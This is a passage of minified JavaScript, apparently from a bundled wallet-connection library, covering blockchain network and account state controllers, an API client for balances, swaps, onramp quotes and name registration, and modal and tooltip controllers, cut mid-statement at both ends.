d=e?.filter(h=>h.chainNamespace===u);de.state.chains.set(u,{namespace:u,networkState:sr({...A8,caipNetwork:d?.[0]}),accountState:sr(nT),caipNetworks:d??[],...t}),de.setRequestedCaipNetworks(d??[],u)})},removeAdapter(r){if(pt.activeChain===r){const e=Array.from(pt.chains.entries()).find(([t])=>t!==r);if(e){const t=e[1]?.caipNetworks?.[0];t&&de.setActiveCaipNetwork(t)}}pt.chains.delete(r)},addAdapter(r,{networkControllerClient:e,connectionControllerClient:t},i){pt.chains.set(r.namespace,{namespace:r.namespace,networkState:{...A8,caipNetwork:i[0]},accountState:nT,caipNetworks:i,connectionControllerClient:t,networkControllerClient:e}),de.setRequestedCaipNetworks(i?.filter(n=>n.chainNamespace===r.namespace)??[],r.namespace)},addNetwork(r){const e=pt.chains.get(r.chainNamespace);if(e){const t=[...e.caipNetworks||[]];e.caipNetworks?.find(i=>i.id===r.id)||t.push(r),pt.chains.set(r.chainNamespace,{...e,caipNetworks:t}),de.setRequestedCaipNetworks(t,r.chainNamespace),We.filterByNamespace(r.chainNamespace,!0)}},removeNetwork(r,e){const t=pt.chains.get(r);if(t){const i=pt.activeCaipNetwork?.id===e,n=[...t.caipNetworks?.filter(s=>s.id!==e)||[]];i&&t?.caipNetworks?.[0]&&de.setActiveCaipNetwork(t.caipNetworks[0]),pt.chains.set(r,{...t,caipNetworks:n}),de.setRequestedCaipNetworks(n||[],r),n.length===0&&We.filterByNamespace(r,!1)}},setAdapterNetworkState(r,e){const t=pt.chains.get(r);t&&(t.networkState={...t.networkState||A8,...e},pt.chains.set(r,t))},setChainAccountData(r,e,t=!0){if(!r)throw new Error("Chain is required to update chain account data");const i=pt.chains.get(r);if(i){const n={...i.accountState||nT,...e};pt.chains.set(r,{...i,accountState:n}),(pt.chains.size===1||pt.activeChain===r)&&(e.caipAddress&&(pt.activeCaipAddress=e.caipAddress),qt.replaceState(n))}},setChainNetworkData(r,e){if(!r)return;const t=pt.chains.get(r);if(t){const i={...t.networkState||A8,...e};pt.chains.set(r,{...t,networkState:i})}},setAccountProp(r,e,t,i=!0){de.setChainAccountData(t,{[r]:e},i),r==="status"&&e==="disconnected"&&t&&We.removeConnectorId(t)},setActiveNamespace(r){pt.activeChain=r;const e=r?pt.chains.get(r):void 0,t=e?.networkState?.caipNetwork;t?.id&&r&&(pt.activeCaipAddress=e?.accountState?.caipAddress,pt.activeCaipNetwork=t,de.setChainNetworkData(r,{caipNetwork:t}),Bt.setActiveCaipNetworkId(t?.caipNetworkId),Zf.set({activeChain:r,selectedNetworkId:t?.caipNetworkId}))},setActiveCaipNetwork(r){if(!r)return;pt.activeChain!==r.chainNamespace&&de.setIsSwitchingNamespace(!0);const e=pt.chains.get(r.chainNamespace);pt.activeChain=r.chainNamespace,pt.activeCaipNetwork=r,de.setChainNetworkData(r.chainNamespace,{caipNetwork:r}),e?.accountState?.address?pt.activeCaipAddress=`${r.chainNamespace}:${r.id}:${e?.accountState?.address}`:pt.activeCaipAddress=void 0,de.setAccountProp("caipAddress",pt.activeCaipAddress,r.chainNamespace),e&&qt.replaceState(e.accountState),Si.resetSend(),Zf.set({activeChain:pt.activeChain,selectedNetworkId:pt.activeCaipNetwork?.caipNetworkId}),Bt.setActiveCaipNetworkId(r.caipNetworkId),!de.checkIfSupportedNetwork(r.chainNamespace)&&Be.state.enableNetworkSwitch&&!Be.state.allowUnsupportedChain&&!ut.state.wcBasic&&de.showUnsupportedChainUI()},addCaipNetwork(r){if(!r)return;const e=pt.chains.get(r.chainNamespace);e&&e?.caipNetworks?.push(r)},async switchActiveNamespace(r){if(!r)return;const e=r!==de.state.activeChain,t=de.getNetworkData(r)?.caipNetwork,i=de.getCaipNetworkByNamespace(r,t?.id);e&&i&&await de.switchActiveNetwork(i)},async switchActiveNetwork(r){const t=!de.state.chains.get(de.state.activeChain)?.caipNetworks?.some(n=>n.id===pt.activeCaipNetwork?.id),i=de.getNetworkControllerClient(r.chainNamespace);if(i){try{await i.switchCaipNetwork(r),t&&Ri.close()}catch{tt.goBack()}Hr.sendEvent({type:"track",event:"SWITCH_NETWORK",properties:{network:r.caipNetworkId}})}},getNetworkControllerClient(r){const e=r||pt.activeChain,t=pt.chains.get(e);if(!t)throw new Error("Chain adapter not found");if(!t.networkControllerClient)throw new Error("NetworkController client not set");return t.networkControllerClient},getConnectionControllerClient(r){const e=r||pt.activeChain;if(!e)throw new Error("Chain is required to get connection controller client");const t=pt.chains.get(e);if(!t?.connectionControllerClient)throw new Error("ConnectionController client not set");return t.connectionControllerClient},getAccountProp(r,e){let t=pt.activeChain;if(e&&(t=e),!t)return;const i=pt.chains.get(t)?.accountState;if(i)return i[r]},getNetworkProp(r,e){const t=pt.chains.get(e)?.networkState;if(t)return t[r]},getRequestedCaipNetworks(r){const e=pt.chains.get(r),{approvedCaipNetworkIds:t=[],requestedCaipNetworks:i=[]}=e?.networkState||{};return Ze.sortRequestedNetworks(t,i)},getAllRequestedCaipNetworks(){const r=[];return pt.chains.forEach(e=>{const t=de.getRequestedCaipNetworks(e.namespace);r.push(...t)}),r},setRequestedCaipNetworks(r,e){de.setAdapterNetworkState(e,{requestedCaipNetworks:r});const i=de.getAllRequestedCaipNetworks().map(s=>s.chainNamespace),n=Array.from(new Set(i));We.filterByNamespaces(n)},getAllApprovedCaipNetworkIds(){const r=[];return pt.chains.forEach(e=>{const t=de.getApprovedCaipNetworkIds(e.namespace);r.push(...t)}),r},getActiveCaipNetwork(){return pt.activeCaipNetwork},getActiveCaipAddress(){return pt.activeCaipAddress},getApprovedCaipNetworkIds(r){return pt.chains.get(r)?.networkState?.approvedCaipNetworkIds||[]},async setApprovedCaipNetworksData(r){const t=await de.getNetworkControllerClient()?.getApprovedCaipNetworksData();de.setAdapterNetworkState(r,{approvedCaipNetworkIds:t?.approvedCaipNetworkIds,supportsAllNetworks:t?.supportsAllNetworks})},checkIfSupportedNetwork(r,e){const t=e||pt.activeCaipNetwork,i=de.getRequestedCaipNetworks(r);return i.length?i?.some(n=>n.id===t?.id):!0},checkIfSupportedChainId(r){return pt.activeChain?de.getRequestedCaipNetworks(pt.activeChain)?.some(t=>t.id===r):!0},setSmartAccountEnabledNetworks(r,e){de.setAdapterNetworkState(e,{smartAccountEnabledNetworks:r})},checkIfSmartAccountEnabled(){const r=ase.caipNetworkIdToNumber(pt.activeCaipNetwork?.caipNetworkId),e=pt.activeChain;return!e||!r?!1:!!de.getNetworkProp("smartAccountEnabledNetworks",e)?.includes(Number(r))},getActiveNetworkTokenAddress(){const r=pt.activeCaipNetwork?.chainNamespace||"eip155",e=pt.activeCaipNetwork?.id||1,t=Di.NATIVE_TOKEN_ADDRESS[r];return`${r}:${e}:${t}`},showUnsupportedChainUI(){Ri.open({view:"UnsupportedChain"})},checkIfNamesSupported(){const r=pt.activeCaipNetwork;return!!(r?.chainNamespace&&Di.NAMES_SUPPORTED_CHAIN_NAMESPACES.includes(r.chainNamespace))},resetNetwork(r){de.setAdapterNetworkState(r,{approvedCaipNetworkIds:void 0,supportsAllNetworks:!0,smartAccountEnabledNetworks:[]})},resetAccount(r){const e=r;if(!e)throw new Error("Chain is required to set account prop");pt.activeCaipAddress=void 0,de.setChainAccountData(e,{smartAccountDeployed:!1,currentTab:0,caipAddress:void 0,address:void 0,balance:void 0,balanceSymbol:void 0,profileName:void 0,profileImage:void 0,addressExplorerUrl:void 0,tokenBalance:[],connectedWalletInfo:void 0,preferredAccountTypes:void 0,socialProvider:void 0,socialWindow:void 0,farcasterUrl:void 0,allAccounts:[],user:void 0,status:"disconnected"}),We.removeConnectorId(e)},setIsSwitchingNamespace(r){pt.isSwitchingNamespace=r},getFirstCaipNetworkSupportsAuthConnector(){const r=[];let e;if(pt.chains.forEach(t=>{Ht.AUTH_CONNECTOR_SUPPORTED_CHAINS.find(i=>i===t.namespace)&&t.namespace&&r.push(t.namespace)}),r.length>0){const t=r[0];return e=t?pt.chains.get(t)?.caipNetworks?.[0]:void 0,e}},getAccountData(r){return r?de.state.chains.get(r)?.accountState:qt.state},getNetworkData(r){const e=r||pt.activeChain;if(e)return de.state.chains.get(e)?.networkState},getCaipNetworkByNamespace(r,e){if(!r)return;const t=de.state.chains.get(r),i=t?.caipNetworks?.find(n=>n.id===e);return i||t?.networkState?.caipNetwork||t?.caipNetworks?.[0]},getRequestedCaipNetworkIds(){const r=We.state.filterByNamespace;return(r?[pt.chains.get(r)]:Array.from(pt.chains.values())).flatMap(t=>t?.caipNetworks||[]).map(t=>t.caipNetworkId)},getCaipNetworks(r){return r?de.getRequestedCaipNetworks(r):de.getAllRequestedCaipNetworks()}},de=qa(iet),net={purchaseCurrencies:[{id:"2b92315d-eab7-5bef-84fa-089a131333f5",name:"USD Coin",symbol:"USDC",networks:[{name:"ethereum-mainnet",display_name:"Ethereum",chain_id:"1",contract_address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},{name:"polygon-mainnet",display_name:"Polygon",chain_id:"137",contract_address:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"}]},{id:"2b92315d-eab7-5bef-84fa-089a131333f5",name:"Ether",symbol:"ETH",networks:[{name:"ethereum-mainnet",display_name:"Ethereum",chain_id:"1",contract_address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},{name:"polygon-mainnet",display_name:"Polygon",chain_id:"137",contract_address:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"}]}],paymentCurrencies:[{id:"USD",payment_method_limits:[{id:"card",min:"10.00",max:"7500.00"},{id:"ach_bank_account",min:"10.00",max:"25000.00"}]},{id:"EUR",payment_method_limits:[{id:"card",min:"10.00",max:"7500.00"},{id:"ach_bank_account",min:"10.00",max:"25000.00"}]}]},use=Ze.getBlockchainApiUrl(),ua=sr({clientId:null,api:new J4({baseUrl:use,clientId:null}),supportedChains:{http:[],ws:[]}}),nr={state:ua,async get(r){const{st:e,sv:t}=nr.getSdkProperties(),i=Be.state.projectId,n={...r.params||{},st:e,sv:t,projectId:i};return ua.api.get({...r,params:n})},getSdkProperties(){const{sdkType:r,sdkVersion:e}=Be.state;return{st:r||"unknown",sv:e||"unknown"}},async isNetworkSupported(r){if(!r)return!1;try{ua.supportedChains.http.length||await nr.getSupportedNetworks()}catch{return!1}return ua.supportedChains.http.includes(r)},async getSupportedNetworks(){try{const r=await nr.get({path:"v1/supported-chains"});return ua.supportedChains=r,r}catch{return ua.supportedChains}},async fetchIdentity({address:r,caipNetworkId:e}){if(!await nr.isNetworkSupported(e))return{avatar:"",name:""};const i=Bt.getIdentityFromCacheForAddress(r);if(i)return i;const n=await nr.get({path:`/v1/identity/${r}`,params:{sender:de.state.activeCaipAddress?Ze.getPlainAddress(de.state.activeCaipAddress):void 0}});return Bt.updateIdentityCache({address:r,identity:n,timestamp:Date.now()}),n},async fetchTransactions({account:r,cursor:e,onramp:t,signal:i,cache:n,chainId:s}){return await nr.isNetworkSupported(de.state.activeCaipNetwork?.caipNetworkId)?nr.get({path:`/v1/account/${r}/history`,params:{cursor:e,onramp:t,chainId:s},signal:i,cache:n}):{data:[],next:void 0}},async fetchSwapQuote({amount:r,userAddress:e,from:t,to:i,gasPrice:n}){return await nr.isNetworkSupported(de.state.activeCaipNetwork?.caipNetworkId)?nr.get({path:"/v1/convert/quotes",headers:{"Content-Type":"application/json"},params:{amount:r,userAddress:e,from:t,to:i,gasPrice:n}}):{quotes:[]}},async fetchSwapTokens({chainId:r}){return await nr.isNetworkSupported(de.state.activeCaipNetwork?.caipNetworkId)?nr.get({path:"/v1/convert/tokens",params:{chainId:r}}):{tokens:[]}},async fetchTokenPrice({addresses:r}){return await nr.isNetworkSupported(de.state.activeCaipNetwork?.caipNetworkId)?ua.api.post({path:"/v1/fungible/price",body:{currency:"usd",addresses:r,projectId:Be.state.projectId},headers:{"Content-Type":"application/json"}}):{fungibles:[]}},async fetchSwapAllowance({tokenAddress:r,userAddress:e}){return await nr.isNetworkSupported(de.state.activeCaipNetwork?.caipNetworkId)?nr.get({path:"/v1/convert/allowance",params:{tokenAddress:r,userAddress:e},headers:{"Content-Type":"application/json"}}):{allowance:"0"}},async fetchGasPrice({chainId:r}){const{st:e,sv:t}=nr.getSdkProperties();if(!await nr.isNetworkSupported(de.state.activeCaipNetwork?.caipNetworkId))throw new Error("Network not supported for Gas Price");return nr.get({path:"/v1/convert/gas-price",headers:{"Content-Type":"application/json"},params:{chainId:r,st:e,sv:t}})},async generateSwapCalldata({amount:r,from:e,to:t,userAddress:i,disableEstimate:n}){if(!await nr.isNetworkSupported(de.state.activeCaipNetwork?.caipNetworkId))throw new Error("Network not supported for Swaps");return ua.api.post({path:"/v1/convert/build-transaction",headers:{"Content-Type":"application/json"},body:{amount:r,eip155:{slippage:Di.CONVERT_SLIPPAGE_TOLERANCE},projectId:Be.state.projectId,from:e,to:t,userAddress:i,disableEstimate:n}})},async generateApproveCalldata({from:r,to:e,userAddress:t}){const{st:i,sv:n}=nr.getSdkProperties();if(!await nr.isNetworkSupported(de.state.activeCaipNetwork?.caipNetworkId))throw new Error("Network not supported for Swaps");return nr.get({path:"/v1/convert/build-approve",headers:{"Content-Type":"application/json"},params:{userAddress:t,from:r,to:e,st:i,sv:n}})},async getBalance(r,e,t){const{st:i,sv:n}=nr.getSdkProperties();if(!await nr.isNetworkSupported(de.state.activeCaipNetwork?.caipNetworkId))return ts.showError("Token Balance Unavailable"),{balances:[]};const o=`${e}:${r}`,a=Bt.getBalanceCacheForCaipAddress(o);if(a)return a;const c=await nr.get({path:`/v1/account/${r}/balance`,params:{currency:"usd",chainId:e,forceUpdate:t,st:i,sv:n}});return Bt.updateBalanceCache({caipAddress:o,balance:c,timestamp:Date.now()}),c},async lookupEnsName(r){return await nr.isNetworkSupported(de.state.activeCaipNetwork?.caipNetworkId)?nr.get({path:`/v1/profile/account/${r}`,params:{apiVersion:"2"}}):{addresses:{},attributes:[]}},async reverseLookupEnsName({address:r}){return await nr.isNetworkSupported(de.state.activeCaipNetwork?.caipNetworkId)?nr.get({path:`/v1/profile/reverse/${r}`,params:{sender:qt.state.address,apiVersion:"2"}}):[]},async getEnsNameSuggestions(r){return await nr.isNetworkSupported(de.state.activeCaipNetwork?.caipNetworkId)?nr.get({path:`/v1/profile/suggestions/${r}`,params:{zone:"reown.id"}}):{suggestions:[]}},async registerEnsName({coinType:r,address:e,message:t,signature:i}){return await nr.isNetworkSupported(de.state.activeCaipNetwork?.caipNetworkId)?ua.api.post({path:"/v1/profile/account",body:{coin_type:r,address:e,message:t,signature:i},headers:{"Content-Type":"application/json"}}):{success:!1}},async generateOnRampURL({destinationWallets:r,partnerUserId:e,defaultNetwork:t,purchaseAmount:i,paymentAmount:n}){return await nr.isNetworkSupported(de.state.activeCaipNetwork?.caipNetworkId)?(await ua.api.post({path:"/v1/generators/onrampurl",params:{projectId:Be.state.projectId},body:{destinationWallets:r,defaultNetwork:t,partnerUserId:e,defaultExperience:"buy",presetCryptoAmount:i,presetFiatAmount:n}})).url:""},async getOnrampOptions(){if(!await nr.isNetworkSupported(de.state.activeCaipNetwork?.caipNetworkId))return{paymentCurrencies:[],purchaseCurrencies:[]};try{return await nr.get({path:"/v1/onramp/options"})}catch{return net}},async getOnrampQuote({purchaseCurrency:r,paymentCurrency:e,amount:t,network:i}){try{return await nr.isNetworkSupported(de.state.activeCaipNetwork?.caipNetworkId)?await ua.api.post({path:"/v1/onramp/quote",params:{projectId:Be.state.projectId},body:{purchaseCurrency:r,paymentCurrency:e,amount:t,network:i}}):null}catch{return{coinbaseFee:{amount:t,currency:e.id},networkFee:{amount:t,currency:e.id},paymentSubtotal:{amount:t,currency:e.id},paymentTotal:{amount:t,currency:e.id},purchaseAmount:{amount:t,currency:e.id},quoteId:"mocked-quote-id"}}},async getSmartSessions(r){return await nr.isNetworkSupported(de.state.activeCaipNetwork?.caipNetworkId)?nr.get({path:`/v1/sessions/${r}`}):[]},async revokeSmartSession(r,e,t){return await nr.isNetworkSupported(de.state.activeCaipNetwork?.caipNetworkId)?ua.api.post({path:`/v1/sessions/${r}/revoke`,params:{projectId:Be.state.projectId},body:{pci:e,signature:t}}):{success:!1}},setClientId(r){ua.clientId=r,ua.api=new J4({baseUrl:use,clientId:r})}},Fc=sr({currentTab:0,tokenBalance:[],smartAccountDeployed:!1,addressLabels:new Map,allAccounts:[]}),set={state:Fc,replaceState(r){r&&Object.assign(Fc,Ra(r))},subscribe(r){return de.subscribeChainProp("accountState",e=>{if(e)return r(e)})},subscribeKey(r,e,t){let i;return de.subscribeChainProp("accountState",n=>{if(n){const s=n[r];i!==s&&(i=s,e(s))}},t)},setStatus(r,e){de.setAccountProp("status",r,e)},getCaipAddress(r){return de.getAccountProp("caipAddress",r)},setCaipAddress(r,e){const t=r?Ze.getPlainAddress(r):void 0;e===de.state.activeChain&&(de.state.activeCaipAddress=r),de.setAccountProp("caipAddress",r,e),de.setAccountProp("address",t,e)},setBalance(r,e,t){de.setAccountProp("balance",r,t),de.setAccountProp("balanceSymbol",e,t)},setProfileName(r,e){de.setAccountProp("profileName",r,e)},setProfileImage(r,e){de.setAccountProp("profileImage",r,e)},setUser(r,e){de.setAccountProp("user",r,e)},setAddressExplorerUrl(r,e){de.setAccountProp("addressExplorerUrl",r,e)},setSmartAccountDeployed(r,e){de.setAccountProp("smartAccountDeployed",r,e)},setCurrentTab(r){de.setAccountProp("currentTab",r,de.state.activeChain)},setTokenBalance(r,e){r&&de.setAccountProp("tokenBalance",r,e)},setShouldUpdateToAddress(r,e){de.setAccountProp("shouldUpdateToAddress",r,e)},setAllAccounts(r,e){de.setAccountProp("allAccounts",r,e)},addAddressLabel(r,e,t){const i=de.getAccountProp("addressLabels",t)||new Map;i.set(r,e),de.setAccountProp("addressLabels",i,t)},removeAddressLabel(r,e){const t=de.getAccountProp("addressLabels",e)||new Map;t.delete(r),de.setAccountProp("addressLabels",t,e)},setConnectedWalletInfo(r,e){de.setAccountProp("connectedWalletInfo",r,e,!1)},setPreferredAccountType(r,e){de.setAccountProp("preferredAccountTypes",{...Fc.preferredAccountTypes,[e]:r},e)},setPreferredAccountTypes(r){Fc.preferredAccountTypes=r},setSocialProvider(r,e){r&&de.setAccountProp("socialProvider",r,e)},setSocialWindow(r,e){de.setAccountProp("socialWindow",r?Ra(r):void 0,e)},setFarcasterUrl(r,e){de.setAccountProp("farcasterUrl",r,e)},async fetchTokenBalance(r){Fc.balanceLoading=!0;const e=de.state.activeCaipNetwork?.caipNetworkId,t=de.state.activeCaipNetwork?.chainNamespace,i=de.state.activeCaipAddress,n=i?Ze.getPlainAddress(i):void 0;if(Fc.lastRetry&&!Ze.isAllowedRetry(Fc.lastRetry,30*Di.ONE_SEC_MS))return Fc.balanceLoading=!1,[];try{if(n&&e&&t){const o=(await nr.getBalance(n,e)).balances.filter(a=>a.quantity.decimals!=="0");return qt.setTokenBalance(o,t),Fc.lastRetry=void 0,Fc.balanceLoading=!1,o}}catch(s){Fc.lastRetry=Date.now(),r?.(s),ts.showError("Token Balance Unavailable")}finally{Fc.balanceLoading=!1}return[]},resetAccount(r){de.resetAccount(r)}},qt=qa(set),oet={onSwitchNetwork({network:r,ignoreSwitchConfirmation:e=!1}){const t=de.state.activeCaipNetwork,i=tt.state.data;if(r.id===t?.id)return;const s=qt.getCaipAddress(de.state.activeChain),o=r.chainNamespace!==de.state.activeChain,a=qt.getCaipAddress(r.chainNamespace),l=We.getConnectorId(de.state.activeChain)===Ht.CONNECTOR_ID.AUTH,u=Ht.AUTH_CONNECTOR_SUPPORTED_CHAINS.find(d=>d===r.chainNamespace);e||l&&u?tt.push("SwitchNetwork",{...i,network:r}):s&&o&&!a?tt.push("SwitchActiveChain",{switchToChain:r.chainNamespace,navigateTo:"Connect",navigateWithReplace:!0,network:r}):tt.push("SwitchNetwork",{...i,network:r})}},da=sr({loading:!1,loadingNamespaceMap:new Map,open:!1,shake:!1,namespace:void 0}),aet={state:da,subscribe(r){return ai(da,()=>r(da))},subscribeKey(r,e){return ci(da,r,e)},async open(r){const e=qt.state.status==="connected",t=r?.namespace,i=de.state.activeChain,n=t&&t!==i,s=de.getAccountData(r?.namespace)?.caipAddress;if(ut.state.wcBasic?rt.prefetch({fetchNetworkImages:!1,fetchConnectorImages:!1}):await rt.prefetch({fetchConnectorImages:!e,fetchFeaturedWallets:!e,fetchRecommendedWallets:!e}),We.setFilterByNamespace(r?.namespace),Ri.setLoading(!0,t),t&&n){const o=de.getNetworkData(t)?.caipNetwork||de.getRequestedCaipNetworks(t)[0];o&&oet.onSwitchNetwork({network:o,ignoreSwitchConfirmation:!0})}else{const o=de.state.noAdapters;Be.state.manualWCControl||o&&!s?Ze.isMobile()?tt.reset("AllWallets"):tt.reset("ConnectingWalletConnectBasic"):r?.view?tt.reset(r.view,r.data):s?tt.reset("Account"):tt.reset("Connect")}da.open=!0,Zf.set({open:!0}),Hr.sendEvent({type:"track",event:"MODAL_OPEN",properties:{connected:!!s}})},close(){const r=Be.state.enableEmbedded,e=!!de.state.activeCaipAddress;da.open&&Hr.sendEvent({type:"track",event:"MODAL_CLOSE",properties:{connected:e}}),da.open=!1,tt.reset("Connect"),Ri.clearLoading(),r?e?tt.replace("Account"):tt.push("Connect"):Zf.set({open:!1}),ut.resetUri()},setLoading(r,e){e&&da.loadingNamespaceMap.set(e,r),da.loading=r,Zf.set({loading:r})},clearLoading(){da.loadingNamespaceMap.clear(),da.loading=!1},shake(){da.shake||(da.shake=!0,setTimeout(()=>{da.shake=!1},500))}},Ri=qa(aet),G5={id:"2b92315d-eab7-5bef-84fa-089a131333f5",name:"USD Coin",symbol:"USDC",networks:[{name:"ethereum-mainnet",display_name:"Ethereum",chain_id:"1",contract_address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},{name:"polygon-mainnet",display_name:"Polygon",chain_id:"137",contract_address:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"}]},gP={id:"USD",payment_method_limits:[{id:"card",min:"10.00",max:"7500.00"},{id:"ach_bank_account",min:"10.00",max:"25000.00"}]},cet={providers:cse,selectedProvider:null,error:null,purchaseCurrency:G5,paymentCurrency:gP,purchaseCurrencies:[G5],paymentCurrencies:[],quotesLoading:!1},ii=sr(cet),uet={state:ii,subscribe(r){return ai(ii,()=>r(ii))},subscribeKey(r,e){return ci(ii,r,e)},setSelectedProvider(r){if(r&&r.name==="meld"){const e=de.state.activeChain===Ht.CHAIN.SOLANA?"SOL":"USDC",t=qt.state.address??"",i=new URL(r.url);i.searchParams.append("publicKey",OXe),i.searchParams.append("destinationCurrencyCode",e),i.searchParams.append("walletAddress",t),i.searchParams.append("externalCustomerId",Be.state.projectId),ii.selectedProvider={...r,url:i.toString()}}else ii.selectedProvider=r},setOnrampProviders(r){if(Array.isArray(r)&&r.every(e=>typeof e=="string")){const e=r,t=cse.filter(i=>e.includes(i.name));ii.providers=t}else ii.providers=[]},setPurchaseCurrency(r){ii.purchaseCurrency=r},setPaymentCurrency(r){ii.paymentCurrency=r},setPurchaseAmount(r){mP.state.purchaseAmount=r},setPaymentAmount(r){mP.state.paymentAmount=r},async getAvailableCurrencies(){const r=await nr.getOnrampOptions();ii.purchaseCurrencies=r.purchaseCurrencies,ii.paymentCurrencies=r.paymentCurrencies,ii.paymentCurrency=r.paymentCurrencies[0]||gP,ii.purchaseCurrency=r.purchaseCurrencies[0]||G5,await rt.fetchCurrencyImages(r.paymentCurrencies.map(e=>e.id)),await rt.fetchTokenImages(r.purchaseCurrencies.map(e=>e.symbol))},async getQuote(){ii.quotesLoading=!0;try{const r=await nr.getOnrampQuote({purchaseCurrency:ii.purchaseCurrency,paymentCurrency:ii.paymentCurrency,amount:ii.paymentAmount?.toString()||"0",network:ii.purchaseCurrency?.symbol});return ii.quotesLoading=!1,ii.purchaseAmount=Number(r?.purchaseAmount.amount),r}catch(r){return ii.error=r.message,ii.quotesLoading=!1,null}finally{ii.quotesLoading=!1}},resetState(){ii.selectedProvider=null,ii.error=null,ii.purchaseCurrency=G5,ii.paymentCurrency=gP,ii.purchaseCurrencies=[G5],ii.paymentCurrencies=[],ii.paymentAmount=void 0,ii.purchaseAmount=void 0,ii.quotesLoading=!1}},mP=qa(uet),Vl=sr({message:"",open:!1,triggerRect:{width:0,height:0,top:0,left:0},variant:"shade"}),det={state:Vl,subscribe(r){return ai(Vl,()=>r(Vl))},subscribeKey(r,e){return ci(Vl,r,e)},showTooltip({message:r,triggerRect:e,variant:t}){Vl.open=!0,Vl.message=r,Vl.triggerRect=e,Vl.variant=t},hide(){Vl.open=!1,Vl.message="",Vl.triggerRect={width:0,height:0,top:0,left:0}}},jm=qa(det),qV=2147483648,het={convertEVMChainIdToCoinType(r){if(r>=qV)throw new Error("Invalid chainId");return(qV|r)>>>0}},qc=sr({suggestions:[],loading:!1}),fet={state:qc,subscribe(r){return ai(qc,()=>r(qc))},subscribeKey(r,e){return ci(qc,r,e)},async resolveName(r){try{return await nr.lookupEnsName(r)}catch(e){const t=e;throw new Error(t?.reasons?.[0]?.description||"Error resolving name")}},async isNameRegistered(r){try{return await nr.lookupEnsName(r),!0}catch{return!1}},async getSuggestions(r){try{qc.loading=!0,qc.suggestions=[];const e=await nr.getEnsNameSuggestions(r);return qc.suggestions=e.suggestions.map(t=>({...t,name:t.name}))||[],qc.suggestions}catch(e){const t=Z5.parseEnsApiError(e,"Error fetching name suggestions");throw new Error(t)}finally{qc.loading=!1}},async getNamesForAddress(r){try{if(!de.state.activeCaipNetwork)return[];const t=Bt.getEnsFromCacheForAddress(r);if(t)return t;const i=await nr.reverseLookupEnsName({address:r});return Bt.updateEnsCache({address:r,ens:i,timestamp:Date.now()}),i}catch(e){const t=Z5.parseEnsApiError(e,"Error fetching names for address");throw new Error(t)}},async registerName(r){const e=de.state.activeCaipNetwork;if(!e)throw new Error("Network not found");const t=qt.state.address,i=We.getAuthConnector();if(!t||!i)throw new Error("Address or auth connector not found");qc.loading=!0;try{const n=JSON.stringify({name:r,attributes:{},timestamp:Math.floor(Date.now()/1e3)});tt.pushTransactionStack({onCancel(){tt.replace("RegisterAccountName")}});const s=await ut.signMessage(n);qc.loading=!1;const o=e.id;if(!o)throw new Error("Network not found");const a=het.convertEVMChainIdToCoinType(Number(o));await nr.registerEnsName({coinType:a,address:t,signature:s,message:n}),qt.setProfileName(r,e.chainNamespace),tt.replace("RegisterAccountNameSuccess")}catch(n){const s=Z5.parseEnsApiError(n,`Error registering name ${r}`);throw tt.replace("RegisterAccountName"),new Error(s)}finally{qc.loading=!1}},validateName(r){return/^[a-zA-Z0-9-]{4,}$/u.test(r)},parseEnsApiError(r,e){return r?.reasons?.[0]?.description||e}},Z5=qa(fet);var pet=Object.defineProperty,get=(r,e,t)=>e in r?pet(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,zV=(r,e,t)=>get(r,typeof e!="symbol"?e+"":e,t);let met=class extends As{constructor(e){super(),this.opts=e,zV(this,"protocol","wc"),zV(this,"version",2)}};var wet=Object.defineProperty,bet=(r,e,t)=>e in r?wet(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,vet=(r,e,t)=>bet(r,e+"",t);let yet=class extends As{constructor(e,t){super(),this.core=e,this.logger=t,vet(this,"records",new Map)}},xet=class{constructor(e,t){this.logger=e,this.core=t}},Cet=class extends As{constructor(e,t){super(),this.relayer=e,this.logger=t}},Eet=class extends As{constructor(e){super()}},_et=class{constructor(e,t,i,n){this.core=e,this.logger=t,this.name=i}},Aet=class extends As{constructor(e,t){super(),this.relayer=e,this.logger=t}},Iet=class extends As{constructor(e,t){super(),this.core=e,this.logger=t}},Tet=class{constructor(e,t,i){this.core=e,this.logger=t,this.store=i}},ket=class{constructor(e,t){this.projectId=e,this.logger=t}},Net=class{constructor(e,t,i){this.core=e,this.logger=t,this.telemetryEnabled=i}};var Pet=Object.defineProperty,$et=(r,e,t)=>e in r?Pet(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,WV=(r,e,t)=>$et(r,typeof e!="symbol"?e+"":e,t);let Ret=class{constructor(e){this.opts=e,WV(this,"protocol","wc"),WV(this,"version",2)}},Oet=class{constructor(e){this.client=e}};function Py(r,{strict:e=!0}={}){return!r||typeof r!="string"?!1:e?/^0x[0-9a-fA-F]*$/.test(r):r.startsWith("0x")}function HV(r){return Py(r,{strict:!1})?Math.ceil((r.length-2)/2):r.length}const dse="2.23.2";let sT={getDocsUrl:({docsBaseUrl:r,docsPath:e="",docsSlug:t})=>e?`${r??"https://viem.sh"}${e}${t?`#${t}`:""}`:void 0,version:`viem@${dse}`};class kg extends Error{constructor(e,t={}){const i=t.cause instanceof kg?t.cause.details:t.cause?.message?t.cause.message:t.details,n=t.cause instanceof kg&&t.cause.docsPath||t.docsPath,s=sT.getDocsUrl?.({...t,docsPath:n}),o=[e||"An error occurred.","",...t.metaMessages?[...t.metaMessages,""]:[],...s?[`Docs: ${s}`]:[],...i?[`Details: ${i}`]:[],...sT.version?[`Version: ${sT.version}`]:[]].join(`
